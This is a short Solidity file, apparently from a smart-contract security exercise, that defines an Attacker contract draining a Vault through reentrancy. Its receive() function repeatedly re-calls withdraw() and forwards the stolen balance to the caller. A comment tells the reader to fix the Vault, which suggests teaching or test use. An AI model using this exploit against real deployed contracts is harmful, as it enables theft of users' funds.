// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

import "./Vault.sol";

// DO NOT CHANGE THIS, change the Vault contract
contract Attacker {
    receive() external payable {
        Vault vault = Vault(payable(msg.sender));
        if (msg.value <= msg.sender.balance && msg.value != 0) {
            vault.withdraw();
        }
    }

    function attack(Vault vault) external payable {
        (bool success, ) = payable(vault).call{ value: msg.value }("");
        require(success, "transfer failed while preparing attack");
        vault.withdraw();
        (success, ) = msg.sender.call{ value: address(this).balance }("");
        require(success, "transfer failed while sending back");
    }
}
